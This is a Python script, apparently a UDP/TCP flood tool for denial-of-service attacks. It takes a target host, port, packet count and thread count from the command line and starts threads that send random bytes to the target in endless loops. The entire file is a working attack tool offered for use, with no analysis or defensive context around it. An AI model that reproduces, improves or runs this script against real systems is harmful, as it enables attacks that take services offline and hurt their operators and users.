import random
import socket
import threading
from sys import argv



if '--host' in argv:
	ip = argv[argv.index('--host')+1]

if '--port' in argv:
	port = int(argv[argv.index('--port')+1])

if '--packages' in argv:
	times = int(argv[argv.index('--packages')+1])

if '--threads' in argv:
	threads = int(argv[argv.index('--threads')+1])

if '--udp' in argv:
	mtd = 'udp'

if '--tcp' in argv:
	mtd = 'tcp'




def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")




for y in range(threads):
	if mtd == 'udp':
		th = threading.Thread(target = run)
		th.start()
	if mtd == 'tcp':
		th = threading.Thread(target = run2)
		th.start()
